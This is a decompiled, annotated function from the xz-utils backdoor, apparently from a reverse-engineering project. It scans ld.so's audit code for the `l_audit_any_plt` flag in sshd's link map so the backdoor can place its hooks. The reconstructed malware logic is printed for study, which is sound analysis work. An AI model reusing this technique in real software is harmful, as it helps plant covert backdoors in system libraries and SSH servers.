// /home/kali/xzre-ghidra/xzregh/104AE0_find_l_audit_any_plt_mask_and_slot.c
// Function: find_l_audit_any_plt_mask_and_slot @ 0x104AE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_l_audit_any_plt_mask_and_slot(backdoor_data_handle_t * data, instruction_search_ctx_t * search_ctx)


/*
 * AutoDoc: Decodes `_dl_audit_symbind_alt` looking for the LEA/MOV/TEST sequence that manipulates `link_map::l_audit_any_plt`. It resolves the libcrypto/libc helper stubs via the fake allocator, runs a three-state scanner (LEA that materialises the displacement, MOV that copies the pointer, and TEST/BT that inspects the flag byte), and when the mask is a single bit it records both the absolute slot and mask inside `hooks->ldso_ctx`. A non-zero bit or a missing pattern flags `search_ctx->result` and aborts the install path.
 */

#include "xzre_types.h"

BOOL find_l_audit_any_plt_mask_and_slot
               (backdoor_data_handle_t *data,instruction_search_ctx_t *search_ctx)

{
  imported_funcs_t *imports;
  libc_imports_t *libc_imports;
  instruction_register_bitmap_t *register_filter;
  backdoor_hooks_data_t *hook_table;
  uchar decoded_mask_register;
  BOOL success;
  u32 mask_bitcount;
  lzma_allocator *libcrypto_allocator;
  pfn_EVP_DecryptInit_ex_t evp_decryptinit_stub;
  lzma_allocator *libc_allocator;
  pfn_getuid_t getuid_stub;
  u8 *audit_flag_slot;
  uchar decoded_pointer_register;
  u8 decoded_register;
  long ctx_clear_idx;
  u8 *computed_slot_ptr;
  dasm_ctx_t *ctx_zero_cursor;
  audit_pattern_state_t pattern_state;
  u8 *audit_walk_cursor;
  u8 bit_test_register;
  dasm_ctx_t insn_ctx;
  
  bit_test_register = 0;
  // AutoDoc: Emit telemetry so secret-data logs can associate audit-bit hunts with later GOT patches.
  success = secret_data_append_bits_from_addr_or_ret
                    ((void *)0x0,(secret_data_shift_cursor_t)0x97,0x1f,9);
  if (success != FALSE) {
    audit_walk_cursor = search_ctx->start_addr;
    ctx_zero_cursor = &insn_ctx;
    for (ctx_clear_idx = 0x16; ctx_clear_idx != 0; ctx_clear_idx = ctx_clear_idx + -1) {
      *(u32 *)&ctx_zero_cursor->instruction = 0;
      ctx_zero_cursor = (dasm_ctx_t *)((u8 *)ctx_zero_cursor + 4);
    }
    libcrypto_allocator = get_fake_lzma_allocator();
    libcrypto_allocator->opaque = data->cached_elf_handles->libcrypto;
    // AutoDoc: Resolve the temporary libcrypto helper via the fake allocator and bump the import counter when it lands.
    evp_decryptinit_stub = (pfn_EVP_DecryptInit_ex_t)lzma_alloc(0xc08,libcrypto_allocator);
    imports = search_ctx->imported_funcs;
    imports->EVP_DecryptInit_ex = evp_decryptinit_stub;
    if (evp_decryptinit_stub != (pfn_EVP_DecryptInit_ex_t)0x0) {
      imports->resolved_imports_count = imports->resolved_imports_count + 1;
    }
    libc_imports = imports->libc;
    libc_allocator = get_fake_lzma_allocator();
    libc_allocator->opaque = data->cached_elf_handles->libc;
    // AutoDoc: Same idea for libc’s `getuid`; both stubs are freed on every exit path.
    getuid_stub = (pfn_getuid_t)lzma_alloc(0x348,libc_allocator);
    libc_imports->getuid = getuid_stub;
    if (getuid_stub != (pfn_getuid_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    pattern_state = AUDIT_PAT_EXPECT_LEA;
    bit_test_register = 0xff;
    for (; audit_walk_cursor < search_ctx->end_addr; audit_walk_cursor = audit_walk_cursor + insn_ctx.instruction_size) {
      success = x86_decode_instruction(&insn_ctx,audit_walk_cursor,search_ctx->end_addr);
      if (success == FALSE) {
        return FALSE;
      }
      // AutoDoc: State 0 looks for the LEA that materialises `link_map::l_name` + displacement.
      if (pattern_state == AUDIT_PAT_EXPECT_LEA) {
        if (((insn_ctx.opcode_window.opcode_window_dword == X86_OPCODE_2B_MOVZX_RM8) &&
            (((ushort)insn_ctx.prefix.flags_u32 & (DF16_MEM_DISP | DF16_MODRM)) == (DF16_MEM_DISP | DF16_MODRM))) &&
           ((byte)(insn_ctx.prefix.modrm_bytes.modrm_mod - 1) < 2)) {
          decoded_pointer_register = 0;
          if ((insn_ctx.prefix.flags_u32 & DF16_MODRM) == 0) {
            decoded_mask_register = 0;
            if (((insn_ctx.prefix.flags_u32 & DF16_MODRM_IMM64_MASK) != 0) &&
               (decoded_mask_register = insn_ctx.prefix.decoded.flags2 & DF2_IMM64,
               (insn_ctx.prefix.flags_u32 & DF16_IMM64) != 0)) {
              if ((insn_ctx.prefix.flags_u32 & DF16_REX) == 0) {
                decoded_pointer_register = 0;
                decoded_mask_register = insn_ctx.mov_imm_reg_index;
              }
              else {
                decoded_mask_register = insn_ctx.mov_imm_reg_index | ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3)
                ;
              }
            }
          }
          else {
            decoded_mask_register = insn_ctx.prefix.decoded.flags & DF1_REX;
            if ((insn_ctx.prefix.flags_u32 & DF16_REX) == 0) {
              decoded_pointer_register = insn_ctx.prefix.modrm_bytes.modrm_rm;
              if ((insn_ctx.prefix.flags_u32 & DF16_MODRM_IMM64_MASK) != 0) {
                decoded_mask_register = insn_ctx.prefix.modrm_bytes.modrm_reg;
              }
            }
            else {
              decoded_pointer_register = insn_ctx.prefix.modrm_bytes.modrm_rm |
                       ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
              decoded_mask_register = 0;
              if ((insn_ctx.prefix.flags_u32 & DF16_MODRM_IMM64_MASK) != 0) {
                decoded_mask_register = insn_ctx.prefix.modrm_bytes.modrm_reg |
                        ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1);
              }
            }
          }
          computed_slot_ptr = (u8 *)0x0;
          if (((insn_ctx.prefix.flags_u32 & DF16_MEM_DISP) != 0) &&
             (computed_slot_ptr = (u8 *)insn_ctx.mem_disp,
             ((uint)insn_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32)) {
            computed_slot_ptr = insn_ctx.instruction + (long)(insn_ctx.mem_disp + insn_ctx.instruction_size);
          }
          // AutoDoc: Only advance once the LEA recomputes the expected displacement and the register filter allows it.
          if (((u8 *)(ulong)(search_ctx->offset_to_match).dwords.offset == computed_slot_ptr) &&
             (((int)(uint)(search_ctx->output_register->fields).allowed_regs >> (decoded_pointer_register & 0x1f) & 1U
              ) != 0)) {
            (search_ctx->output_register->fields).reg_index = decoded_mask_register;
            pattern_state = AUDIT_PAT_EXPECT_MOV;
          }
        }
      }
      // AutoDoc: State 1 waits for the MOV that copies the pointer into a trackable register.
      else if (pattern_state == AUDIT_PAT_EXPECT_MOV) {
        if ((insn_ctx.opcode_window.opcode_window_dword & 0xfffffffd) == X86_OPCODE_1B_OR_RM_R) {
          register_filter = search_ctx->output_register_to_match;
          decoded_pointer_register = insn_ctx.prefix.decoded.flags & DF1_MODRM;
          if ((insn_ctx.prefix.flags_u32 & DF16_MODRM_IMM64_MASK) == 0) {
            decoded_mask_register = 0;
            if ((insn_ctx.prefix.flags_u32 & DF16_MODRM) != 0) goto LAB_00104d83;
            if ((register_filter->fields).reg_index != '\0') goto LAB_00104e97;
            decoded_register = 0;
LAB_00104da0:
            if ((search_ctx->output_register->fields).reg_index != decoded_pointer_register) goto LAB_00104da9;
          }
          else {
            if ((insn_ctx.prefix.flags_u32 & DF16_MODRM) == 0) {
              if ((insn_ctx.prefix.flags_u32 & DF16_IMM64) == 0) {
                if ((register_filter->fields).reg_index == '\0') {
                  decoded_mask_register = 0;
                  decoded_register = 0;
                  goto LAB_00104da0;
                }
                goto LAB_00104e97;
              }
              decoded_mask_register = insn_ctx.mov_imm_reg_index;
              if ((insn_ctx.prefix.flags_u32 & DF16_REX) != 0) {
                decoded_mask_register = insn_ctx.mov_imm_reg_index | ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3)
                ;
              }
            }
            else {
              decoded_mask_register = insn_ctx.prefix.modrm_bytes.modrm_reg;
              if ((insn_ctx.prefix.flags_u32 & DF16_REX) != 0) {
                decoded_mask_register = insn_ctx.prefix.modrm_bytes.modrm_reg |
                        ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1);
              }
LAB_00104d83:
              decoded_pointer_register = insn_ctx.prefix.modrm_bytes.modrm_rm;
              if ((insn_ctx.prefix.flags_u32 & DF16_REX) != 0) {
                decoded_pointer_register = insn_ctx.prefix.modrm_bytes.modrm_rm |
                         ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
              }
            }
            decoded_register = (register_filter->fields).reg_index;
            if (decoded_register == decoded_mask_register) goto LAB_00104da0;
LAB_00104da9:
            if ((decoded_pointer_register != decoded_register) || ((search_ctx->output_register->fields).reg_index != decoded_mask_register))
            goto LAB_00104e97;
          }
          pattern_state = AUDIT_PAT_EXPECT_TEST;
          bit_test_register = decoded_pointer_register;
          if (insn_ctx.opcode_window.opcode_window_dword != X86_OPCODE_1B_OR_RM_R) {
            bit_test_register = decoded_mask_register;
          }
        }
      }
      // AutoDoc: State 2 requires a TEST/BT against the same register before we evaluate the mask.
      else if (pattern_state == AUDIT_PAT_EXPECT_TEST) {
        if (insn_ctx.opcode_window.opcode_window_dword == X86_OPCODE_1B_TEST_AL_IMM8) {
          decoded_register = 0;
        }
        else {
          if ((insn_ctx.opcode_window.opcode_window_dword != X86_OPCODE_1B_GRP3_IMM8) ||
             (insn_ctx.prefix.modrm_bytes.modrm_reg != 0)) goto LAB_00104e97;
          decoded_register = 0;
          if ((insn_ctx.prefix.flags_u32 & DF16_MODRM_IMM64_MASK) != 0) {
            if ((insn_ctx.prefix.flags_u32 & DF16_MODRM) == 0) {
              decoded_register = insn_ctx.prefix.decoded.flags2 & DF2_IMM64;
              if (((insn_ctx.prefix.flags_u32 & DF16_IMM64) != 0) &&
                 (decoded_register = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u32 & DF16_REX) != 0)) {
                decoded_register = insn_ctx.mov_imm_reg_index |
                         ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
              }
            }
            else {
              decoded_register = insn_ctx.prefix.decoded.flags & 0x20;
              if ((insn_ctx.prefix.flags_u32 & DF16_REX) != 0) {
                decoded_register = ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1);
              }
            }
          }
        }
        if (bit_test_register == decoded_register) {
          // AutoDoc: Mask must fit in a byte and have a single set bit; anything else means the structure changed.
          if ((insn_ctx.imm_zeroextended < 0x100) &&
             (mask_bitcount = popcount_u64(insn_ctx.imm_zeroextended), mask_bitcount == 1)) {
            hook_table = search_ctx->hooks;
            audit_flag_slot = (byte *)((long)&data->runtime_data->sshd_link_map->l_addr +
                              (ulong)(search_ctx->offset_to_match).dwords.offset);
            (hook_table->ldso_ctx).sshd_link_map_l_audit_any_plt_addr = audit_flag_slot;
            (hook_table->ldso_ctx).link_map_l_audit_any_plt_bitmask = (u8)insn_ctx.imm_zeroextended;
            if ((*audit_flag_slot & insn_ctx.imm_zeroextended) == 0) {
              return TRUE;
            }
          }
          // AutoDoc: Expose partial matches (bit already set/mask mismatch) so the caller can warn the operator.
          search_ctx->result = TRUE;
          return FALSE;
        }
      }
LAB_00104e97:
    }
    libcrypto_allocator->opaque = data->cached_elf_handles->libcrypto;
    lzma_free(search_ctx->imported_funcs->EVP_DecryptInit_ex,libcrypto_allocator);
    lzma_free(libc_imports->getuid,libc_allocator);
  }
  return FALSE;
}

